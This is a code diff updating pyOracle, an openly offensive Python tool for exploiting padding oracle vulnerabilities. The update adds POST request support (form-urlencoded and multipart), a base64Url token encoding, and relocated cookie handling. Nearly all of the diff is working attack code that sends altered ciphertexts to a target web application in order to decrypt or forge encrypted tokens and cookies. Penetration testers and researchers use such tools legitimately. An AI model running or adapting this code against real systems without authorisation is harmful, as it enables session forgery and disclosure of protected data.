@@ -1,6 +1,6 @@
-# pyOracle 2.0.3
+# pyOracle 2.1
 # A python padding oracle vulnerability exploitation tool
-# By Paul Mueller (l1qu1d)
+# By Paul Mueller (@paulmmueller)
 
 import socket
 import requests
@@ -26,6 +26,22 @@ def makeCookieString(cookies):
         cookieString = cookieString + k + "=" + v + ';'
     return cookieString
 
+
+def encode_multipart(fields):
+    boundary = binascii.hexlify(os.urandom(16)).decode('ascii')
+
+    body = (
+        "".join("--%s\r\n"
+                "Content-Disposition: form-data; name=\"%s\"\r\n"
+                "\r\n"
+                "%s\r\n" % (boundary, field, value)
+                for field, value in fields.items()) +
+        "--%s--\r\n" % boundary
+    )
+
+    content_type = "multipart/form-data; boundary=%s" % boundary
+
+    return body, content_type
 
 def split_by_n(seq,n):
     """A generator to divide a sequence into chunks of n units."""
@@ -88,7 +104,7 @@ def paddify(string,blocksize):
 # The job object holds the state for the encrypt/decrypt operation and contains the majority of the cryptographic code
 class Job:
     # set variables for the instance 
-    def __init__(self,blocksize,mode,debug,sourceString,name,ivMode,URL,httpMethod,additionalParameters,httpProxyOn,httpProxyIp,httpProxyPort,headers,iv,oracleMode,oracleText,vulnerableParameter,inputMode,cookies,encodingMode):
+    def __init__(self,blocksize,mode,debug,sourceString,name,ivMode,URL,httpMethod,additionalParameters,httpProxyOn,httpProxyIp,httpProxyPort,headers,iv,oracleMode,oracleText,vulnerableParameter,inputMode,cookies,encodingMode,postFormat):
     
         print('[*]Initializing job....')
         
@@ -103,7 +119,7 @@ class Job:
         if self.debug == True:
             print(f"[+]Debug Mode ON\n")
         else:
-            print(f"[.]Debug MOde OFF\n")  
+            print(f"[.]Debug Mode OFF\n")  
 
         self.sourceString = sourceString
         if self.debug == True:
@@ -126,6 +142,7 @@ class Job:
         self.vulnerableParameter = vulnerableParameter
         self.inputMode = inputMode
         self.encodingMode = encodingMode
+        self.postFormat = postFormat
             
             
         # establish state on current completed block
@@ -168,13 +185,24 @@ class Job:
     # make the HTTP request to the target to check current padding array against padding oracle
     def makeRequest(self,encryptedstring):
 
+        tempcookies = self.cookies.copy()
+
+        # if the vulnerable parameter is a cookie, add it
+        if self.inputMode == "cookie":
+            tempcookies[self.vulnerableParameter] = encryptedstring
+
+        # if there are additional cookies they get added here
+        cookieString = makeCookieString(tempcookies)
+        headers['Cookie'] = cookieString
+
+
         if self.httpMethod == "GET":
         
             urlBuilder = self.URL
 
             if self.inputMode == 'parameter':
                 # add the vulnerable parameter 
-                urlBuilder = urlBuilder + '?' + self.vulnerableParameter + '=' + b64urlEncode(encryptedstring)
+                urlBuilder = urlBuilder + '?' + self.vulnerableParameter + '=' + encryptedstring
 
                 # if we already set a GET, additionals should start with "&"
                 firstDelimiter = "&"
@@ -189,21 +217,28 @@ class Job:
                     delimiter = '&'
                 urlBuilder = urlBuilder + delimiter + additionalParameter[0] + '=' + additionalParameter[1] 
 
-            tempcookies = self.cookies.copy()            
-
-            # if the vulnerable parameter is a cookie, add it
-            if self.inputMode == "cookie":
-                tempcookies[self.vulnerableParameter] = encryptedstring
-
-            # if there are cookies (additional or vulnerable parameters) they get added here
-            cookieString = makeCookieString(tempcookies)
-            headers['Cookie'] = cookieString
                          
             r = requests.get(urlBuilder,headers=self.headers,proxies=self.proxy,verify=False,allow_redirects=False)    
                 
         elif (self.httpMethod == "POST"):
-            print('POST is not implimented yet. sorry!')
-            sys.exit(2)
+
+            # first, get the additional parameters
+            postData = self.additionalParameters.copy()
+            
+            if self.inputMode == 'parameter':
+
+                # add the vulnerable parameter
+                postData[self.vulnerableParameter] = encryptedstring
+
+            if (self.postFormat == "form-urlencoded"):
+                self.headers["Content-Type"] = "application/x-www-form-urlencoded"
+                r = requests.post(self.URL,data=postData,headers=self.headers,proxies=self.proxy,verify=False,allow_redirects=False)
+
+            elif (self.postFormat == "multipart"):
+
+                postData,multipartContentType = encode_multipart(postData)
+                self.headers['Content-Type'] = multipartContentType
+                r = requests.post(self.URL,data=postData,headers=self.headers,proxies=self.proxy,verify=False,allow_redirects=False)
             
         return r        
 
@@ -241,6 +276,9 @@ class Job:
 
         if encodingMode == 'base64':
             tempToken = urllib.parse.quote_plus(bytes_to_base64(tempTokenBytes)) #re-base64 that string
+
+        if encodingMode == 'base64Url':
+            tempToken = bytes_to_base64(bytes(tempTokenBytes)).encode().replace('=','').replace("+","-").replace('/','_')
 
         if encodingMode == 'hex':
             tempToken = tempTokenBytes.hex().upper()
@@ -294,10 +332,13 @@ class Job:
                 for k,v in solved_intermediates.items(): #populate the previous bytes with the correct values based on the changing padding but constant intermediates
                     
                     padding_array[k] = v ^ padding_num
-                tempTokenBytes = bytearray(self.fakeIV() + padding_array + previousBlock) 
+                tempTokenBytes = bytes(self.fakeIV() + padding_array + previousBlock) 
 
                 if encodingMode == 'base64':
-                    tempToken = urllib.parse.quote_plus(bytes_to_base64(tempTokenBytes)) 
+                    tempToken = urllib.parse.quote_plus(bytes_to_base64(tempTokenBytes))
+
+                if encodingMode == 'base64Url':
+                    tempToken = bytes_to_base64(bytes(tempTokenBytes)).decode().replace('=','').replace("+","-").replace('/','_') 
 
                 if encodingMode == 'hex':
                     tempToken = tempTokenBytes.hex().upper()
@@ -391,6 +432,9 @@ class Job:
                 if self.encodingMode == 'base64':
                     tempToken = urllib.parse.quote_plus(bytes_to_base64(tempTokenBytes)) #re-base64 that string
 
+                if self.encodingMode == 'base64Url':
+                    tempToken = bytes_to_base64(tempTokenBytes).decode().replace('=','').replace("+","-").replace('/','_')
+
                 if self.encodingMode == 'hex':
                     tempToken = tempTokenBytes.hex().upper()
 
@@ -469,6 +513,9 @@ class Job:
             if encodingMode == 'base64':
                 encryptTemp = b64urlEncode(urllib.parse.quote_plus(bytes_to_base64(joinedCrypto)))
 
+            if encodingMode == "base64Url":
+                encryptTemp = bytes_to_base64(joinedCrypto).decode().replace('=','').replace("+","-").replace('/','_')
+
             if encodingMode == 'hex':
                 encryptTemp = joinedCrypto.hex().upper()
             oracleCheckResult = self.makeRequest(encryptTemp) #make the request with the messed with encryptedstring
@@ -491,8 +538,16 @@ class Job:
   
         # decode the encrypted string
 
-        if encodingMode == 'base64':
+        if (encodingMode == 'base64') or (encodingMode == 'base64Url'):
+            # some base64 implementations strip padding, if so we need to add it back
+            unquoted_sourcestring += '=' * (len(unquoted_sourcestring) % 4)
+
+        if encodingMode == 'base64Url':
+            unquoted_sourcestring = unquoted_sourcestring.replace('-','+').replace('_','/')
+
+        if (encodingMode == 'base64') or (encodingMode == 'base64Url'):
             decoded_sourcestring = binascii.a2b_base64(unquoted_sourcestring)
+
         if encodingMode == 'hex':
             decoded_sourcestring = bytes.fromhex(unquoted_sourcestring)
 
@@ -509,6 +564,7 @@ class Job:
         
         #Get the block count and save it to the instance
         print(actualBlocks)
+        print(int(len(actualBlocks)))
         self.blockCount = int((len(actualBlocks) / self.blocksize))                
         
         # if the mode is 'firstblock' we need to remove the first block and assign it as the IV
@@ -666,6 +722,7 @@ else:
     vulnerableParameter = config['default']['vulnerableParameter']
     inputMode = config['default']['inputMode']
     encodingMode = config['default']['encodingMode']
+    postFormat = config['default']['postFormat']
     
     # config value validation
     
@@ -684,7 +741,8 @@ else:
         handleError("[x]CONFIG ERROR: encodingMode required")
 
     else:
-        if ((encodingMode != "base64") and (encodingMode != "hex")):
+        validEncodingModes = ['base64','base64Url','hex']
+        if (encodingMode not in validEncodingModes):
             handleError("[x]CONFIG ERROR: invalid encodingMode")
     
 
@@ -692,7 +750,17 @@ else:
     if ((httpMethod != "GET") and (httpMethod != "POST")):
         handleError("[x]CONFIG ERROR: httpMethod not valid. Must be 'GET' or 'POST'")
 
-        
+    # Validate POST format
+    if ((httpMethod == "POST")):
+
+        if postFormat == "form-urlencoded":
+            pass
+
+        elif postFormat == "multipart":
+            pass
+           # handleError("[x]CONFIG ERROR: multipart mode not supported yet :(")
+        else:
+            handleError("[x]CONFIG ERROR: When httpMethod is POST postFormat must be 'form-urlencoded' or 'multipart'")   
         
     # validate proxy IP
     if httpProxyIp:
@@ -755,12 +823,11 @@ else:
 
 
     # Initialize Job object
-    job = Job(blocksize,args.mode,args.debug,args.input,name,ivMode,URL,httpMethod,additionalParameters,httpProxyOn,httpProxyIp,httpProxyPort,headers,iv,oracleMode,oracleText,vulnerableParameter,inputMode,cookies,encodingMode)
+    job = Job(blocksize,args.mode,args.debug,args.input,name,ivMode,URL,httpMethod,additionalParameters,httpProxyOn,httpProxyIp,httpProxyPort,headers,iv,oracleMode,oracleText,vulnerableParameter,inputMode,cookies,encodingMode,postFormat)
     job.initialize()
 
 print(f'Starting job in {job.mode} mode. Attempting to {job.mode} the following string: {args.input}')
 writeToLog(f'Starting job in {job.mode} mode. Attempting to {job.mode} the following string: {args.input}')
-
 
 while job.currentBlock < (job.blockCount):
        
@@ -776,9 +843,6 @@ while job.currentBlock < (job.blockCount):
         #Print the current progress so far       
         job.printProgress()
         
-    
-
- 
     else:
         print(f"[!]Something went wrong with block {job.currentBlock}. Will repeat block")
 
@@ -802,6 +866,9 @@ if job.mode == "encrypt":
 
     if encodingMode == 'base64':
         encryptFinal = b64urlEncode(urllib.parse.quote_plus(bytes_to_base64(joinedCrypto)))
+
+    if encodingMode == 'base64Url':
+        encryptFinal = bytes_to_base64(joinedCrypto).decode().replace('=','').replace("+","-").replace('/','_')
 
     if encodingMode == 'hex':
         encryptFinal = joinedCrypto.hex().upper()
